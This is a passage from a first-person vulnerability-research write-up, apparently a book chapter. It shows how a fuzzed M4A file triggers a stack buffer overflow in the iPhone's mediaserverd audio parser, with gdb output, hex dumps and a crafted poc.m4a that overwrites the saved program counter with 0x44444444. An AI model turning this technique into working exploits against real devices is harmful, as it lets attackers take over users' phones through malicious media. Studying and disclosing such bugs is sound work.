class="emphasis"><em>file40.m4a</em></span>):</p><a id="I_programlisting8_d1e9449"/><pre class="programlisting">00000020h: 00 00 1C 65 6D 6F 6F 76 <span class="underline">FF</span> 00 <span class="underline">00</span> 6C 6D 76 68 64 ; ...emoovÿ..lmvhd</pre><p>And here is the new test-case file (<span class="emphasis"><em>file40_2.m4a</em></span>) with changes underlined:</p><a id="I_programlisting8_d1e9462"/><pre class="programlisting">00000020h: 00 00 1C 65 6D 6F 6F 76 <span class="underline">00</span> 00 <span class="underline">02</span> 6C 6D 76 68 64 ; ...emoovÿ..lmvhd</pre><p>I rebooted the device to get a clean environment, attached the debugger to <code class="literal">mediaserverd</code> again, and opened the new file in MobileSafari.</p><a id="I_programlisting8_d1e9475"/><pre class="programlisting">Program received signal EXC_BAD_ACCESS, Could not access memory.
+Reason: KERN_PROTECTION_FAILURE at address: 0x00000072
+[Switching to process 27 thread 0xa10b]
+0x00000072 in ?? ()</pre><p>This time the program counter (instruction pointer) was manipulated to point to address <code class="literal">0x00000072</code>. I then stopped the debugging session and started a new one while again setting a breakpoint at the <code class="literal">memcpy()</code> call in <code class="literal">MP4AudioStream::ParseHeader()</code>:</p><a id="I_programlisting8_d1e9488"/><pre class="programlisting">(gdb) <strong class="userinput"><code>break *0x3493d5dc</code></strong>
+Breakpoint 1 at 0x3493d5dc
+
+(gdb) <strong class="userinput"><code>continue</code></strong>
+Continuing.</pre><p>When I opened the modified test-case file <span class="emphasis"><em>file40_2.m4a</em></span> in MobileSafari, I got the following output in the debugger:</p><a id="I_programlisting8_d1e9502"/><pre class="programlisting">[Switching to process 71 thread 0x9f07]
+
+Breakpoint 1, 0x3493d5dc in MP4AudioStream::ParseHeader ()</pre><p>I printed the current call stack:</p><a id="I_programlisting8_d1e9506"/><pre class="programlisting"><strong class="userinput"><code>(gdb) backtrace</code></strong>
+<strong class="userinput"><code>#0  0x3493d5dc in MP4AudioStream::ParseHeader ()</code></strong>
+#1  0x3490d748 in AudioFileStreamWrapper::ParseBytes ()
+#2  0x3490cfa8 in AudioFileStreamParseBytes ()
+#3  0x345dad70 in PushBytesThroughParser ()
+#4  0x345dbd3c in FigAudioFileStreamFormatReaderCreateFromStream ()
+#5  0x345dff08 in instantiateFormatReader ()
+#6  0x345e02c4 in FigFormatReaderCreateForStream ()
+#7  0x345d293c in itemfig_assureBasicsReadyForInspectionInternal ()
+#8  0x345d945c in itemfig_makeReadyForInspectionThread ()
+#9  0x3146178c in _pthread_body ()
+#10 0x00000000 in ?? ()</pre><p>The first stack frame on the list was the one I was looking for. I used the following command to display information about the current stack frame of <code class="literal">MP4AudioStream::ParseHeader()</code>:</p><a id="I_programlisting8_d1e9518"/><pre class="programlisting">(gdb) <strong class="userinput"><code>info frame 0</code></strong>
+Stack frame at 0x1301c00:
+ pc = 0x3493d5dc in MP4AudioStream::ParseHeader(AudioFileStream
+Continuation&amp;); saved pc 0x3490d748
+ called by frame at 0x1301c30
+ Arglist at 0x1301bf8, args:
+ Locals at 0x1301bf8, Saved registers:
+  r4 at 0x1301bec, r5 at 0x1301bf0, r6 at 0x1301bf4, r7
+ at 0x1301bf8, r8 at                                   → 0x1301be0, sl at
+ 0x1301be4, fp at 0x1301be8, lr at 0x1301bfc, <strong class="userinput"><code>pc at 0x1301bfc</code></strong>,
+  s16 at 0x1301ba0, s17 at 0x1301ba4, s18 at 0x1301ba8, s19 at
+ 0x1301bac, s20 at                    → 0x1301bb0, s21 at 0x1301bb4,
+ s22 at 0x1301bb8, s23 at 0x1301bbc,
+  s24 at 0x1301bc0, s25 at 0x1301bc4, s26 at 0x1301bc8, s27 at
+ 0x1301bcc, s28 at                    → 0x1301bd0, s29 at 0x1301bd4,
+ s30 at 0x1301bd8, s31 at 0x1301bdc</pre><p>The most interesting information was the memory location where the program counter (<code class="literal">pc</code> register) was stored on the stack. As the debugger output shows, <code class="literal">pc</code> was saved at address <code class="literal">0x1301bfc</code> on the stack (see “<code class="literal">Saved registers</code>”).</p><p>I then continued the execution of the process:</p><a id="I_programlisting8_d1e9542"/><pre class="programlisting">(gdb) <strong class="userinput"><code>continue</code></strong>
+Continuing.
+
+Program received signal EXC_BAD_ACCESS, Could not access memory.
+Reason: KERN_PROTECTION_FAILURE at address: 0x00000072
+0x00000072 in ?? ()</pre><p>After the crash, I looked at the stack location (memory address <code class="literal">0x1301bfc</code>) where the <code class="literal">MP4AudioStream::ParseHeader()</code> function expects to find its saved program counter.</p><a id="I_programlisting8_d1e9555"/><pre class="programlisting">(gdb) <strong class="userinput"><code>x/12x 0x1301bfc</code></strong>
+0x1301bfc:      0x00000073      0x00000000      0x04000001      0x0400002d
+0x1301c0c:      0x00000000      0x73747328      0x00000063      0x00000000
+0x1301c1c:      0x00000002      0x00000001      0x00000017      0x00000001</pre><p>The debugger output shows that the saved instruction pointer was overwritten with the value <code class="literal">0x00000073</code>. When the function tried to return to its caller function, the manipulated value was assigned to the instruction pointer (<code class="literal">pc</code> register). Specifically, the value <code class="literal">0x00000072</code> was copied into the instruction pointer instead of the file value <code class="literal">0x00000073</code> due to the instruction alignment of the ARM CPU (instruction alignment on a 16-bit or 32-bit boundary).<a id="IDX-CHP-8-0026" class="indexterm"/><a id="IDX-CHP-8-0027" class="indexterm"/></p><p>My extremely simple fuzzer had indeed found a classic stack buffer overflow in the audio libraries of the iPhone. I searched the test-case file for the byte pattern of the debugger output and found the byte sequence at file offset 500 in <span class="emphasis"><em>file40_2.m4a</em></span>:</p><a id="I_programlisting8_d1e9586"/><pre class="programlisting">000001f0h: 18 73 74 74 <span class="underline">73 00 00 00</span> 00 00 00 00 01 00 00 04 ; .stts...........
+00000200h: 2D 00 00 04 00 00 00 00 28 73 74 73 63 00 00 00 ; -.......(stsc...
+00000210h: 00 00 00 00 02 00 00 00 01 00 00 00 17 00 00 00 ; ................</pre><p>I then changed the underlined value above to <code class="literal">0x44444444</code> and named the new file <span class="emphasis"><em>poc.m4a</em></span>:</p><a id="I_programlisting8_d1e9599"/><pre class="programlisting">000001f0h: 18 73 74 74 <span class="underline">44 44 44 44</span> 00 00 00 00 01 00 00 04 ; .sttDDDD.........
+00000200h: 2D 00 00 04 00 00 00 00 28 73 74 73 63 00 00 00 ; -.......(stsc...
+00000210h: 00 00 00 00 02 00 00 00 01 00 00 00 17 00 00 00 ; ................</pre><p>I attached the debugger to <code class="literal">mediaserverd</code> again and opened the new <span class="emphasis"><em>poc.m4a</em></span> file in MobileSafari, which resulted in the following debugger output:</p><a id="I_programlisting8_d1e9612"/><pre class="programlisting">Program received signal EXC_BAD_ACCESS, Could not access memory.
+Reason: KERN_INVALID_ADDRESS at address: 0x44444444
+[Switching to process 77 thread 0xa20f]
+<strong class="userinput"><code>0x44444444 in ?? ()</code></strong>
+
+(gdb) <strong class="userinput"><code>info registers</code></strong>
+r0             0x6474613f       1685348671
+r1             0x393fc284       960479876
+r2             0xcb0            3248
+r3             0x10b            267
+r4             0x6901102        110104834
+r5             0x1808080        25198720
+r6             0x2              2
+r7             0x74747318       1953788696
+r8             0xf40100         15991040
+r9             0x817a00         8485376
+sl             0xf40100         15991040
+fp             0x80808005      −2139062267
+ip             0x20044          131140
+sp             0x684c00         6835200
+lr             0x1f310          127760
+<strong class="userinput"><code>pc             0x44444444</code></strong>       1145324612
+cpsr           {0x60000010, n = 0x0, z = 0x1, c = 0x1, v = 0x0,
+ q = 0x0, j = 0x0, ge = 0x0, e = 0x0, a = 0x0, i = 0x0, f = 0x0, t = 0x0,
+ mode = 0x10}   {0x60000010, n = 0, z = 1, c = 1, v = 0, q = 0, j = 0, ge = 0,
+ e = 0, a = 0, i = 0, f = 0, t = 0, mode = usr}
+
+<strong class="userinput"><code>(gdb) backtrace</code></strong>
+<strong class="userinput"><code>#0  0x44444444 in ?? ()</code></strong>
+Cannot access memory at address 0x74747318</pre><p>Yay! At this point I had full control over the program counter.<a id="IDX-CHP-8-0028" class="indexterm"/></p></div></body></html>
